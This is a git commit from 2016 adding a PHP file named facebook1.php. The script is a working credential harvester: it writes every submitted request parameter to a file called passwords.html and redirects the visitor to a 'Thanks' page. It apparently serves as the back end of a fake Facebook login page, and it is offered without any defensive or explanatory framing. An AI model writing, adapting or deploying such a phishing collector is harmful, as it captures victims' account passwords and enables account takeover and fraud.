5a8cd7d4bc198e047ae2b655ef9d8fafe84c872d
food-drink <christian.daily7@gmail.com>
2016-11-28 18:58:38 +0100

    Create facebook1.php

---
+++ facebook1.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: /Thanks.php');
+$handle = fopen("passwords.html", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
